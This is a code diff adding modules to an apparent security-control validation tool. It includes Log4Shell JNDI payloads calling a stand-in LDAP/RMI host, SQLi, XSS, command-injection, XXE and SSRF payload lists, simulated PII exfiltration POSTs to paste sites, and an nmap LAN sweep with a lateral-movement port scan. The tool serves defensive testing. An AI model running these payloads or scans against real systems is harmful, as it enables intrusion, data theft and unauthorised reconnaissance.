+    status_counts: dict[str, int] = {}
+    issuer_fp_map: dict[str, list[str]] = {}   # issuer-fingerprint → [hosts]
+    intercepted_rows: list[dict] = []
+    unverified_rows:  list[dict] = []
+
+    for r in results:
+        status = r.get("status", "ERROR")
+        status_counts[status] = status_counts.get(status, 0) + 1
+
+        fp      = r.get("fingerprint", "")
+        fp_abbr = fp[:16] if fp else ""
+
+        # Track issuer fingerprint (use first 16 chars as proxy-CA key)
+        if fp and status not in ("UNREACHABLE", "ERROR"):
+            issuer_fp_map.setdefault(fp[:16], []).append(r["host"])
+
+        vendor = r.get("proxy_vendor", "")
+
+        if status == "INTERCEPTED":
+            # Issuer column: show vendor name in bold red
+            issuer_display = f"[bold red]{vendor}[/]"
+            if r.get("issuer_cn"):
+                issuer_display += f"[red] ({r['issuer_cn']})[/]"
+            status_str = "[bold red]⚠ INTERCEPTED[/]"
+            intercepted_rows.append(r)
+        elif status == "CLEAN":
+            cn  = r.get("issuer_cn", "")
+            org = r.get("issuer_org", "")
+            issuer_display = f"{cn} / {org}" if (cn and org) else cn or org or "—"
+            status_str = "[green]✓ CLEAN[/]"
+        elif status == "UNVERIFIED":
+            cn  = r.get("issuer_cn", "")
+            org = r.get("issuer_org", "")
+            issuer_display = (f"[yellow]{cn} / {org}[/]" if (cn and org)
+                              else f"[yellow]{cn or org or 'unknown CA'}[/]")
+            status_str = "[yellow]? UNVERIFIED[/]"
+            unverified_rows.append(r)
+        elif status == "UNREACHABLE":
+            issuer_display = f"[dim]{r.get('error', '')}[/]"
+            status_str = "[dim]UNREACHABLE[/]"
+        else:
+            issuer_display = f"[dim]{r.get('error', '')}[/]"
+            status_str = "[dim]ERROR[/]"
+
+        tbl.add_row(
+            r.get("host", ""),
+            r.get("subject_cn") or "—",
+            issuer_display,
+            r.get("not_after", "") or "—",
+            fp_abbr or "—",
+            status_str,
+        )
+
+        # Record stats
+        if status == "CLEAN":
+            _stats.ok()
+        elif status in ("INTERCEPTED", "UNVERIFIED"):
+            _stats.block()
+        elif status == "UNREACHABLE":
+            _stats.drop()
+        else:
+            _stats.fail()
+
+    console.print(tbl)
+
+    # ── Per-host interception alerts ──────────────────────────────────────────
+    if intercepted_rows:
+        lines = ["[bold red]TLS INSPECTION DETECTED — proxy CA is re-signing these certificates:[/]\n"]
+        for r in intercepted_rows:
+            vendor  = r["proxy_vendor"]
+            host    = r["host"]
+            subj    = r.get("subject_cn") or host
+            issuer  = r.get("issuer_cn") or r.get("issuer_org") or vendor
+            expires = r.get("not_after", "")
+            fp      = r.get("fingerprint", "")
+            lines.append(
+                f"  [bold red]⚠  {host}[/]\n"
+                f"     Expected:  original certificate from {host}\n"
+                f"     [bold red]Received:  certificate signed by {vendor}[/]  ← PROXY CA\n"
+                f"     Subject:   {subj}\n"
+                f"     Issuer:    {issuer}\n"
+                + (f"     Expires:   {expires}\n" if expires else "")
+                + (f"     SHA-256:   {fp[:32]}…\n" if fp else "")
+            )
+        console.print(Panel("\n".join(lines),
+                            title="[bold red]⚠  TLS INSPECTION ALERT[/]",
+                            border_style="red"))
+
+    if unverified_rows:
+        lines = ["[yellow]A certificate was presented but it did NOT verify against the trust store.[/]\n"
+                 "[yellow]The proxy is likely re-signing but its CA is not installed in this container.[/]\n"
+                 "[yellow]Inject the proxy CA via EXTRA_CA_CERT env var or bind-mount a .crt file.[/]\n"]
+        for r in unverified_rows:
+            issuer = r.get("issuer_cn") or r.get("issuer_org") or "unknown CA"
+            lines.append(f"  [yellow]?  {r['host']}  (issuer: {issuer})[/]")
+        console.print(Panel("\n".join(lines),
+                            title="[yellow]⚠  UNVERIFIED CERTIFICATES[/]",
+                            border_style="yellow"))
+
+    # ── Detect shared-CA by fingerprint grouping (unknown proxy vendors) ──────
+    shared_cas = {fp: hosts for fp, hosts in issuer_fp_map.items()
+                  if len(hosts) >= 3
+                  and not any(r.get("proxy_vendor") for r in results
+                              if r.get("fingerprint", "")[:16] == fp)}
+    if shared_cas:
+        console.print(
+            "\n[yellow]⚠  Same certificate fingerprint on 3+ unrelated sites — "
+            "possible unknown proxy CA:[/]"
+        )
+        for fp, hosts in shared_cas.items():
+            console.print(f"   fp={fp}  sites={', '.join(hosts)}")
+
+    # ── Final summary ─────────────────────────────────────────────────────────
+    clean       = status_counts.get("CLEAN", 0)
+    intercepted = status_counts.get("INTERCEPTED", 0)
+    unverified  = status_counts.get("UNVERIFIED", 0)
+    unreachable = status_counts.get("UNREACHABLE", 0)
+
+    if intercepted > 0 and clean > 0:
+        # Identify which vendor(s) are intercepting
+        vendors = list({r["proxy_vendor"] for r in intercepted_rows if r.get("proxy_vendor")})
+        vendor_str = " + ".join(vendors) if vendors else "unknown proxy"
+        console.print(
+            f"\n[red]⚠  {intercepted} site(s) intercepted by {vendor_str}  |  "
+            f"{clean} site(s) bypassed (not decrypted)[/]\n"
+            f"[dim]   Selective bypass detected — proxy has category or ASN whitelist rules.[/]"
+        )
+    elif intercepted > 0:
+        vendors = list({r["proxy_vendor"] for r in intercepted_rows if r.get("proxy_vendor")})
+        vendor_str = " + ".join(vendors) if vendors else "unknown proxy"
+        console.print(
+            f"\n[red]⚠  All reachable traffic is being decrypted by {vendor_str}.[/]"
+        )
+    elif unverified > 0:
+        console.print(
+            f"\n[yellow]⚠  Proxy is intercepting but the proxy CA is not installed "
+            f"in this container.[/]\n"
+            f"[dim]   Use EXTRA_CA_CERT or bind-mount the proxy CA .crt file.[/]"
+        )
+    else:
+        console.print(
+            f"\n[green]✓  No TLS inspection detected — all original certificates received.[/]"
+        )
+
+    summary = (
+        f"[green]{clean} clean[/]  "
+        f"[{'red' if intercepted else 'dim'}]{intercepted} intercepted[/]  "
+        f"[{'yellow' if unverified else 'dim'}]{unverified} unverified[/]"
+        + (f"  [dim]{unreachable} unreachable[/]" if unreachable else "")
+    )
+    ui_ok(f"TLS inspection check complete  {summary}")
+
+
+def log4shell_probe() -> None:
+    """
+    Inject Log4Shell (CVE-2021-44228) JNDI payloads into common HTTP request
+    headers targeting testmyids.com and OWASP Juice Shop.
+
+    Headers exercised: User-Agent, X-Api-Version, X-Forwarded-For, Referer,
+    Authorization, X-Custom-IP-Authorization.  Payloads use LDAP, RMI and DNS
+    lookup vectors (${jndi:ldap://...}, ${jndi:rmi://...}, ${jndi:dns://...}).
+
+    Detects whether:
+      • IDS/IPS has Suricata SID 2034907/2034908 (ET EXPLOIT Log4j)
+      • WAF (Cloudflare, AWS WAF, F5, Imperva) blocks JNDI in headers
+      • SASE inline inspection catches the exploit pattern in HTTP headers
+    """
+    _JNDI_VARIANTS = [
+        "${jndi:ldap://log4shell.test/exploit}",
+        "${jndi:ldap://log4shell-test.com/a}",
+        "${jndi:rmi://log4shell.test/exploit}",
+        "${jndi:dns://log4shell.test/a}",
+        "${${lower:j}ndi:${lower:l}dap://log4shell.test/exploit}",
+        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4shell.test/a}",
+    ]
+    _HEADERS = [
+        "User-Agent",
+        "X-Api-Version",
+        "X-Forwarded-For",
+        "Referer",
+        "Authorization",
+        "X-Custom-IP-Authorization",
+    ]
+    targets = ["http://www.testmyids.com", "https://juice-shop.herokuapp.com"]
+    probes = []
+    for target in targets:
+        for header in _HEADERS:
+            payload = random.choice(_JNDI_VARIANTS)
+            probes.append((f"{header} → {target}", target, header, payload))
+
+    ui_banner("Log4Shell Probe", f"{len(probes)} header injections (CVE-2021-44228)")
+    ok_count = 0
+    for label, url, header, payload in probes:
+        try:
+            console.log(f"  {header:<30}  {url}")
+            result = subprocess.run(
+                ["curl", "-k", "-s", "--show-error", "--connect-timeout", "3",
+                 "-I", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "5",
+                 "-H", f"{header}: {payload}", url],
+                capture_output=True, text=True, timeout=10,
+            )
+            status = result.stdout.strip()
+            console.log(f"    ↳ [{_status_style(status)}]HTTP {status}[/]  payload={payload[:40]}")
+            _stats.record(status)
+            ok_count += 1
+        except Exception as e:
+            _stats.fail()
+            console.log(f"    ↳ [yellow]error: {e}[/]")
+        time.sleep(random.uniform(0.3, 0.7))
+    ui_ok(f"Log4Shell probe complete  ({ok_count}/{len(probes)} sent)")
+
+
+def shadow_it() -> None:
+    """
+    HEAD requests to unsanctioned cloud applications that CASB / SSE platforms
+    (Zscaler, Netskope, Cato, Prisma) classify as personal file sharing,
+    personal messaging, crypto, or shadow IT.
+
+    This exercises app-control policies on CASB/SSE platforms.  No data is
+    uploaded — only HEAD requests are made to test URL-category and
+    app-identification rules.  Destinations include: Dropbox, Box, MEGA,
+    WeTransfer, Discord, Telegram, WhatsApp Web, ProtonMail, Pastebin,
+    Coinbase, Notion, and similar.
+    """
+    n = _size_to_limits(ARGS.size, 10, len(shadow_it_endpoints), len(shadow_it_endpoints),
+                        len(shadow_it_endpoints))
+    ui_banner("Shadow IT / Unsanctioned Apps",
+              f"{n} HEAD requests → CASB app-control categories")
+    try:
+        random.shuffle(shadow_it_endpoints)
+        _run_head_batch(shadow_it_endpoints[:n], "SHADOW-IT", user_agents,
+                        connect_timeout=4, max_time=8)
+        ui_ok("Shadow IT sweep complete")
+    except Exception as e:
+        _stats.fail()
+        ui_error(f"[shadow_it] {e}")
+
+
+def data_exfil_http() -> None:
+    """
+    POST synthetic PII and credential payloads to public paste / file-drop
+    services (Pastebin, Hastebin, transfer.sh, etc.).
+
+    The POST bodies contain patterns that DLP content-inspection engines and
+    CASB platforms are trained to detect:
+      • US Social Security Numbers  (nnn-nn-nnnn)
+      • Payment card numbers (Luhn-valid 16-digit patterns)
+      • Private key / credential blocks
+      • Email + password combination lists
+
+    All destinations will reject the POST (403/422/redirect), but the outbound
+    HTTP request and its body are visible to inline DLP and CASB.  No real PII
+    is sent.
+    """
+    _PII_TEMPLATES = [
+        ("ssn_list",     "Name: John Doe\nSSN: 123-45-6789\nDOB: 1985-03-14\nAddress: 123 Main St"),
+        ("cc_data",      "CardNumber: 4532015112830366\nExpiry: 12/26\nCVV: 123\nName: Jane Smith"),
+        ("credentials",  "username: admin\npassword: P@ssw0rd123!\napi_key: sk-live-xG9aB2cD3eF4g5H"),
+        ("private_key",  "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...(fake)...\n-----END RSA PRIVATE KEY-----"),
+        ("pw_dump",      "admin:$2b$12$fakehashedpassword1234567\nroot:$2b$12$fakehashedpassword7654321"),
+        ("pii_csv",      "first,last,ssn,email\nAlice,Smith,234-56-7890,alice@corp.com\nBob,Jones,345-67-8901,bob@corp.com"),
+    ]
+
+    n = _size_to_limits(ARGS.size, 3, 6, len(data_exfil_targets), len(data_exfil_targets))
+    random.shuffle(data_exfil_targets)
+    targets = data_exfil_targets[:n]
+
+    ui_banner("HTTP Data Exfil Simulation", f"{n} POSTs with synthetic PII/credential payloads")
+    ok_count = 0
+    for i, url in enumerate(targets, 1):
+        label, body = random.choice(_PII_TEMPLATES)
+        ua = random.choice(user_agents)
+        console.log(f"  ({i}/{n}) POST {url}  payload={label}")
+        try:
+            resp = requests.post(
+                url,
+                data={"content": body, "format": "text", "expiry": "10m"},
+                headers={"User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded"},
+                timeout=6,
+                verify=False,
+                allow_redirects=False,
+            )
+            _stats.record(str(resp.status_code))
+            console.log(f"    ↳ [{_status_style(str(resp.status_code))}]HTTP {resp.status_code}[/]")
+            ok_count += 1
+        except requests.exceptions.ConnectionError as e:
+            if "refused" in str(e).lower() or "reset" in str(e).lower():
+                _stats.block()
+            else:
+                _stats.drop()
+            console.log(f"    ↳ [yellow]connection error: {e.__class__.__name__}[/]")
+        except requests.exceptions.Timeout:
+            _stats.drop()
+            console.log("    ↳ [yellow]timeout[/]")
+        except Exception as e:
+            _stats.fail()
+            console.log(f"    ↳ [yellow]error: {e}[/]")
+        time.sleep(random.uniform(0.5, 1.5))
+    ui_ok(f"HTTP exfil simulation complete  ({ok_count}/{n} sent)")
+
+
+def waf_attack() -> None:
+    """
+    Send HTTP requests with WAF-triggering payloads in URL query parameters
+    and POST bodies against intentionally-vulnerable / pen-test-authorised
+    web targets.
+
+    Attack categories:
+      • SQL injection  (Union-based, error-based, blind boolean)
+      • Cross-site scripting  (reflected, DOM)
+      • Local file inclusion  (../etc/passwd variants)
+      • Server-side request forgery  (internal metadata probes)
+      • OS command injection  (semicolon, pipe, backtick)
+      • XML external entity (XXE)
+      • Server-side template injection (SSTI)
+
+    Targets: OWASP Juice Shop, testmyids.com, hackazon, vulnweb.
+    All are public pen-test sandboxes that explicitly authorise this traffic.
+
+    Validates that WAF inline inspection (Cloudflare, F5 AWAF, Imperva,
+    AWS WAF, Palo Alto App-ID) fires on query-parameter and body payloads,
+    not just URL-path patterns (which ids-trigger already covers).
+    """
+    _ATTACKS = [
+        # SQL injection — query params
+        ("SQLi union",      "GET",  "{base}/?id=1'+UNION+SELECT+null,table_name,null+FROM+information_schema.tables--",   None),
+        ("SQLi error",      "GET",  "{base}/?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,version()))--",                          None),
+        ("SQLi blind",      "GET",  "{base}/?id=1'+AND+1=1--",                                                             None),
+        ("SQLi sleep",      "GET",  "{base}/?id=1';+WAITFOR+DELAY+'0:0:5'--",                                              None),
+        # XSS — reflected in params
+        ("XSS script",      "GET",  "{base}/?q=<script>alert(document.cookie)</script>",                                   None),
+        ("XSS img",         "GET",  "{base}/?name=<img+src=x+onerror=alert(1)>",                                           None),
+        ("XSS svg",         "GET",  "{base}/?s=<svg/onload=alert(1)>",                                                     None),
+        # LFI / path traversal
+        ("LFI etc/passwd",  "GET",  "{base}/?file=../../../../etc/passwd",                                                 None),
+        ("LFI win ini",     "GET",  "{base}/?page=....//....//....//windows/win.ini",                                      None),
+        # SSRF
+        ("SSRF metadata",   "GET",  "{base}/?url=http://169.254.169.254/latest/meta-data/",                                None),
+        ("SSRF localhost",  "GET",  "{base}/?redirect=http://127.0.0.1:8080/admin",                                        None),
+        # Command injection — POST body
+        ("CMDi semicolon",  "POST", "{base}/search",  {"q": "; cat /etc/passwd"}),
+        ("CMDi pipe",       "POST", "{base}/search",  {"q": "| whoami"}),
+        ("CMDi backtick",   "POST", "{base}/search",  {"q": "`id`"}),
+        # XXE — POST body (XML content-type)
+        ("XXE entity",      "POST", "{base}/api",
+         "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"),
+        # SSTI
+        ("SSTI Jinja2",     "GET",  "{base}/?name={{7*7}}",                                                                None),
+        ("SSTI Twig",       "GET",  "{base}/?tpl={{_self.env.registerUndefinedFilterCallback('exec')}}",                   None),
+    ]
+
+    n = _size_to_limits(ARGS.size, 8, len(_ATTACKS), len(_ATTACKS), len(_ATTACKS))
+    probes = random.sample(_ATTACKS, k=min(n, len(_ATTACKS)))
+    base = random.choice(waf_attack_targets).rstrip("/")
+
+    ui_banner("WAF Attack Simulation",
+              f"{len(probes)} payloads → {base}")
+    ok_count = 0
+    for label, method, path_tmpl, body in probes:
+        url = path_tmpl.replace("{base}", base)
+        ua  = random.choice(user_agents)
+        console.log(f"  {method:<4}  {label:<20}  {url[:80]}")
+        try:
+            if method == "GET":
+                result = subprocess.run(
+                    ["curl", "-k", "-s", "--show-error", "--connect-timeout", "4",
+                     "-I", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "6",
+                     "-A", ua, url],
+                    capture_output=True, text=True, timeout=12,
+                )
+                status = result.stdout.strip()
+                _stats.record(status)
+            else:
+                headers = {"User-Agent": ua}
+                if isinstance(body, str):
+                    headers["Content-Type"] = "application/xml"
+                    resp = requests.post(url, data=body, headers=headers,
+                                         timeout=6, verify=False, allow_redirects=False)
+                else:
+                    resp = requests.post(url, data=body or {}, headers=headers,
+                                         timeout=6, verify=False, allow_redirects=False)
+                status = str(resp.status_code)
+                _stats.record(status)
+            console.log(f"    ↳ [{_status_style(status)}]HTTP {status}[/]")
+            ok_count += 1
+        except Exception as e:
+            _stats.fail()
+            console.log(f"    ↳ [yellow]error: {e}[/]")
+        time.sleep(random.uniform(0.2, 0.6))
+    ui_ok(f"WAF attack simulation complete  ({ok_count}/{len(probes)} sent)")
+
+
+def tor_anonymizer() -> None:
+    """
+    HEAD requests to Tor Project, commercial VPN landing pages, and web-proxy
+    / anonymiser sites.
+
+    Every major NGFW, SASE, and DNS-filter vendor (Cisco Umbrella, Palo Alto,
+    Fortinet, Zscaler, Netskope) has a dedicated "anonymizers" or "proxy
+    avoidance" URL-filter category that covers these destinations.  Accessing
+    them tests whether the URL-filter policy is active and correctly applied.
+    """
+    n = _size_to_limits(ARGS.size, 8, len(tor_anonymizer_endpoints),
+                        len(tor_anonymizer_endpoints), len(tor_anonymizer_endpoints))
+    ui_banner("Tor / Anonymiser Probe",
+              f"{n} HEAD requests → anonymizer URL-filter category")
+    try:
+        random.shuffle(tor_anonymizer_endpoints)
+        _run_head_batch(tor_anonymizer_endpoints[:n], "ANON", user_agents,
+                        connect_timeout=4, max_time=8)
+        ui_ok("Tor/anonymiser probe complete")
+    except Exception as e:
+        _stats.fail()
+        ui_error(f"[tor_anonymizer] {e}")
+
+
+def _detect_host_lan() -> "tuple[str, str] | None":
+    """Return (gateway_ip, subnet/24) for the physical LAN the Docker host uses.
+
+    Strategies (tried in order):
+      0. HOST_LAN_IP env var — set by stager.sh before the container starts
+         using ``hostname -I`` on the host.  Most reliable: the host resolves
+         its own IP before Docker networking is involved at all.
+      1. Parse /proc/net/route — no external tools required.
+      2. ``ip route show`` — for environments where ip(8) is available.
+      3. Traceroute to 8.8.8.8, take first non-docker hop.
+    """
+    import os as _os
+    import socket as _socket
+    import struct as _struct
+    import re as _re
+
+    _LOOPBACK = _re.compile(r"^127\.")
+    _DOCKER_BRIDGE = _re.compile(r"^172\.(1[6-9]|2[0-9]|3[01])\.")
+    _IP_RE = _re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")
+
+    def _hex_to_ip(h: str) -> str:
+        return _socket.inet_ntoa(_struct.pack("<I", int(h, 16)))
+
+    def _to_24(ip: str) -> str:
+        return ".".join(ip.split(".")[:3]) + ".0/24"
+
+    # Strategy 0 — HOST_LAN_CIDR env var injected by stager.sh before container start
+    _env_cidr = _os.environ.get("HOST_LAN_CIDR", "").strip()
+    if _env_cidr and "/" in _env_cidr:
+        _eip, _epfx = _env_cidr.split("/", 1)
+        if _IP_RE.match(_eip) and _epfx.isdigit():
+            _prefix = int(_epfx)
+            if _prefix == 32:
+                # Every host is its own /32 — microsegmentation is on.
+                # Scan the containing /24 to probe east-west policy.
+                return _eip, _to_24(_eip)
+            elif _prefix >= 24:
+                # Use actual subnet (/24, /25, /26, /28, etc.)
+                import ipaddress as _ipaddress
+                _net = str(_ipaddress.ip_network(f"{_eip}/{_prefix}", strict=False))
+                return _eip, _net
+            else:
+                # Subnet larger than /24 (/16, /8, etc.) — cap at /24 to keep
+                # scan time reasonable (a /16 is 65535 hosts).
+                return _eip, _to_24(_eip)
+
+    # Strategy 1 — /proc/net/route (no tools needed, works in any container)
+    try:
+        default_gw: str | None = None
+        with open("/proc/net/route") as _f:
+            for _line in _f.readlines()[1:]:
+                _fields = _line.strip().split()
+                if len(_fields) < 8:
+                    continue
+                _iface   = _fields[0]
+                _dest    = _hex_to_ip(_fields[1])
+                _gw      = _hex_to_ip(_fields[2])
+                _flags   = int(_fields[3], 16)
+                # RTF_UP=0x1, RTF_GATEWAY=0x2
+                _is_up      = bool(_flags & 0x1)
+                _is_gw_flag = bool(_flags & 0x2)
+                if not _is_up:
+                    continue
+                if _iface == "lo" or _LOOPBACK.match(_dest):
+                    continue
+                if _dest == "0.0.0.0":
+                    # Default route — save gateway as fallback
+                    if not default_gw and _gw != "0.0.0.0":
+                        default_gw = _gw
+                    continue
+                # Connected route (no gateway flag) — this is the local subnet
+                if not _is_gw_flag and _gw == "0.0.0.0":
+                    if _DOCKER_BRIDGE.match(_dest):
+                        continue  # skip docker bridge subnet
+                    return _to_24(_dest).split("/")[0].rsplit(".", 1)[0] + ".1", _to_24(_dest)
+        # Fallback: use default gateway's /24
+        if default_gw and not _DOCKER_BRIDGE.match(default_gw):
+            return default_gw, _to_24(default_gw)
+    except Exception:
+        pass
+
+    # Strategy 2 — ip route show
+    try:
+        r = subprocess.run(["ip", "route", "show"],
+                           capture_output=True, text=True, timeout=5)
+        for _line in r.stdout.splitlines():
+            _m = _re.match(r"^(\d+\.\d+\.\d+\.\d+)/(\d+)\s+dev\s+(\S+)", _line)
+            if not _m:
+                continue
+            _ip, _iface = _m.group(1), _m.group(3)
+            if _iface in ("lo",) or _iface.startswith(("docker", "br-", "veth")):
+                continue
+            if _DOCKER_BRIDGE.match(_ip) or _LOOPBACK.match(_ip):
+                continue
+            return ".".join(_ip.split(".")[:3]) + ".1", _ip + "/24"
+    except Exception:
+        pass
+
+    # Strategy 3 — traceroute: first non-docker hop
+    try:
+        tr = subprocess.run(
+            ["traceroute", "-n", "-m", "4", "-w", "2", "-q", "1", "8.8.8.8"],
+            capture_output=True, text=True, timeout=25,
+        )
+        for _line in tr.stdout.splitlines()[1:]:
+            _m = _re.search(r"(\d+\.\d+\.\d+\.\d+)", _line)
+            if not _m:
+                continue
+            _ip = _m.group(1)
+            if _DOCKER_BRIDGE.match(_ip) or _LOOPBACK.match(_ip):
+                continue
+            return _ip, _to_24(_ip)
+    except Exception:
+        pass
+
+    return None
+
+
+def lateral_movement_sim() -> None:
+    """
+    Simulate east-west lateral movement:
+
+      Phase 1 — Ping sweep (nmap -sn) the entire /24 of the Docker host's
+        physical LAN gateway (detected via routing table or traceroute,
+        skipping the Docker bridge 172.17.x.x) to enumerate live hosts.
+      Phase 2 — Port scan every discovered host (up to 20) on common
+        lateral-movement ports:
+        22 (SSH), 88 (Kerberos), 135 (WMI/RPC), 137-139 (NetBIOS),
+        389 (LDAP), 445 (SMB), 636 (LDAPS), 3389 (RDP),
+        5985/5986 (WinRM HTTP/HTTPS).
+
+    Per-host outcomes are classified and recorded so the security dashboard
+    reflects actual firewall behaviour:
+      open ports       → ok()   (probe succeeded — no east-west firewall)
+      all ports closed → block()  (host reachable, ports actively rejected/RST)
+      all ports filtered → drop() (silently dropped — firewall blocking east-west)
+      nmap error       → fail()
+
+    Targets are RFC1918 space local to the container — no external hosts are
+    scanned.  Generates east-west NGFW alerts (Palo Alto, Fortinet), SIEM
+    lateral-movement correlation, and network IDS SMB/RDP recon signatures.
+    """
+    _LATERAL_PORTS = "22,88,135,137,138,139,389,445,636,3389,5985,5986"
+
+    # ── Detect host LAN (not Docker bridge) and derive /24 subnet ────────────
+    lan = _detect_host_lan()
+    if not lan:
+        ui_warn("lateral_movement_sim: cannot determine host LAN subnet — skipping")
+        _stats.fail()
+        return
+    gw_ip, subnet = lan
+    _cidr = os.environ.get("HOST_LAN_CIDR", "").strip()
+    _src = "stager.sh" if _cidr else "auto-detected"
+    _microseg = _cidr.endswith("/32")
+
+    if _microseg:
+        ui_warn("Microsegmentation detected (host prefix /32) — scanning /24 to probe east-west policy")
+
+    ui_banner("Lateral Movement Simulation",
+              f"gateway={gw_ip}  subnet={subnet}  source={_src}  ports={_LATERAL_PORTS}")
+
+    # ── Phase 1: ping sweep ──────────────────────────────────────────────────
+    console.log(f"[cyan]Phase 1[/] ping sweep → {subnet}")
+    live_hosts: list[str] = []
+    try:
+        sweep = subprocess.run(
+            ["nmap", "-sn", "--send-ip", "-T4",
+             "--max-retries", "1", "--host-timeout", "10s",
+             "-oG", "-", subnet],
+            capture_output=True, text=True, timeout=240,
+        )
+        for line in sweep.stdout.splitlines():
+            if "Status: Up" in line:
+                m = re.search(r"Host:\s+(\d+\.\d+\.\d+\.\d+)", line)
+                if m:
+                    live_hosts.append(m.group(1))
+        console.log(f"  sweep done — {len(live_hosts)} live host(s): "
+                    f"{', '.join(live_hosts[:10]) or 'none'}")
+        _stats.ok()
+    except Exception as e:
+        console.log(f"[yellow]ping sweep error: {e}[/]")
+        _stats.fail()
+
+    # ── Phase 2: lateral-movement port scan ──────────────────────────────────
+    scan_targets = (live_hosts[:20] if live_hosts else [gw_ip])
+    console.log(f"[cyan]Phase 2[/] port scan {_LATERAL_PORTS} → "
+                f"{len(scan_targets)} target(s)")
+    total_open = 0
+    for i, host in enumerate(scan_targets, 1):
+        console.log(f"  ({i}/{len(scan_targets)}) scanning {host}")
+        try:
+            port_result = subprocess.run(
+                ["nmap", "-Pn", f"-p{_LATERAL_PORTS}", host, "-T4",
+                 "--max-retries", "0", "--host-timeout", "30s", "-oG", "-"],
+                capture_output=True, text=True, timeout=60,
+            )
+            open_ports:     list[str] = []
+            closed_ports:   list[str] = []
+            filtered_ports: list[str] = []
+            for line in port_result.stdout.splitlines():
+                # grepable: "Host: 10.0.0.1 ()  Ports: 22/closed/tcp//ssh///, 445/filtered/tcp//..."
+                if line.startswith("Host:") and "Ports:" in line:
+                    ports_raw = line.split("Ports:", 1)[1]
+                    for entry in ports_raw.split(","):
+                        parts = entry.strip().split("/")
+                        if len(parts) >= 2:
+                            port_num, state = parts[0], parts[1]
+                            if state == "open":
+                                open_ports.append(port_num)
+                            elif state == "closed":
+                                closed_ports.append(port_num)
+                            elif "filtered" in state:
+                                filtered_ports.append(port_num)
+
+            # Log per-host summary
+            summary_parts = []
+            if open_ports:
+                summary_parts.append(f"[red]open: {','.join(open_ports)}[/]")
+            if closed_ports:
+                summary_parts.append(f"[yellow]closed: {len(closed_ports)}[/]")
+            if filtered_ports:
+                summary_parts.append(f"[green]filtered: {len(filtered_ports)}[/]")
+            console.log(f"    ↳ {host}  " + ("  ".join(summary_parts) or "no ports info"))
+
+            total_open += len(open_ports)
+            if open_ports:
+                _stats.ok()       # probe reached open service — no east-west block
+            elif filtered_ports and not closed_ports:
+                _stats.drop()     # all silently dropped — firewall blocking east-west
+            elif closed_ports:
+                _stats.block()    # actively rejected (TCP RST from host or firewall)
+            else:
+                _stats.drop()     # host completely unreachable
+        except Exception as e:
+            console.log(f"[yellow]  port scan {host}: {e}[/]")
+            _stats.fail()
+        if i < len(scan_targets):
+            time.sleep(random.uniform(0.3, 1.0))
+
+    ui_ok(f"Lateral movement simulation complete  "
+          f"(subnet={subnet}  live={len(live_hosts)}  open_ports_found={total_open})")
+
+
+# ══════════════════════════════════════════════════════════════════════════════
 # CLI & RUNNER
 # ══════════════════════════════════════════════════════════════════════════════
 
@@ -2882,7 +3975,10 @@ _SUITE_MAP: dict[str, list] = {
     "https":            [https_random, https_crawl],
     "icmp":             [ping_random, traceroute_random],
     "ids-trigger":      [ips],
+    "tls-check":        [tls_inspection_check],
     "kyber":            [kyber_random],
+    "lateral-movement": [lateral_movement_sim],
+    "log4shell":        [log4shell_probe],
     "malware-agents":   [malware_random],
     "malware-download": [malware_download],
     "metasploit-check": [metasploit_check],
@@ -2891,12 +3987,16 @@ _SUITE_MAP: dict[str, list] = {
     "ntp":              [ntp_random],
     "phishing-domains": [github_phishing_domain_check],
     "pornography":      [pornography_crawl],
-    "snmp":             [snmp_random],
+    "shadow-it":        [shadow_it],
+    "snmp":             [snmp_v1, snmp_v2c, snmp_v3],
     "s3":               [s3_sim],
     "squatting":        [squatting_domains],
     "ssh":              [ssh_random],
+    "tor-anonymizer":   [tor_anonymizer],
     "url-response":     [urlresponse_random],
     "virus":            [virus_sim],
+    "waf-attack":       [waf_attack],
+    "data-exfil-http":  [data_exfil_http],
     "web-scanner":      [web_scanner],
 }
 
@@ -2946,10 +4046,15 @@ def finish_test() -> None:
     if not ARGS.nowait:
         if ARGS.loop:
             wait = random.randint(2, max(3, int(ARGS.max_wait_secs)))
-            progress_wait(wait, label="Pause between iterations")
         else:
             wait = random.randint(2, 5)
-            progress_wait(wait, label="Pause between tests")
+        with _WEB_STATE_LOCK:
+            _WEB_STATE["pause_until"] = time.time() + wait
+        _web_flush()
+        progress_wait(wait, label="Pause between iterations" if ARGS.loop else "Pause between tests")
+        with _WEB_STATE_LOCK:
+            _WEB_STATE["pause_until"] = 0.0
+        _web_flush()
     console.print("")   # visual separator in output
 
 
@@ -2958,18 +4063,25 @@ def run_test(func_list: list) -> None:
     Execute `func_list` tests.
 
     * Non-loop mode: run each function once in shuffled order.
-    * Loop mode: pick a random function each iteration, run indefinitely,
-      kicking the watchdog after each test so it doesn't time out.
+    * Loop mode: cycle through the full list in a new random order each round,
+      guaranteeing every test runs once per round before any repeats.
     """
     ui_startup_banner()
     time.sleep(0.3)     # let the banner render before test output begins
 
     iteration = 0
     if ARGS.loop:
+        deck: list = []
+        round_num = 0
         while True:
+            if not deck:
+                round_num += 1
+                deck = func_list[:]
+                random.shuffle(deck)
+                console.rule(f"[dim]round {round_num} — {len(deck)} tests[/]")
+            func = deck.pop()
             iteration += 1
             console.rule(f"[dim]iteration {iteration}[/]")
-            func = random.choice(func_list)
             _run_guarded(func)
             WATCHDOG.kick()
             finish_test()
@@ -3026,8 +4138,8 @@ def parse_cli() -> argparse.Namespace:
         help=f"Test suite to run (default: all).  Choices:\n  {', '.join(suite_choices)}",
     )
     traffic.add_argument(
-        "--size", type=str.upper, choices=["XS", "S", "M", "L", "XL"], default="M",
-        help="Volume of traffic: XS=tiny  S=small  M=medium  L=large  XL=extra-large (default: M)",
+        "--size", type=str.upper, choices=["XS", "S", "M", "L", "XL"], default="S",
+        help="Volume of traffic: XS=tiny  S=small  M=medium  L=large  XL=extra-large (default: S)",
     )
 
     timing = parser.add_argument_group("Timing & Loop")
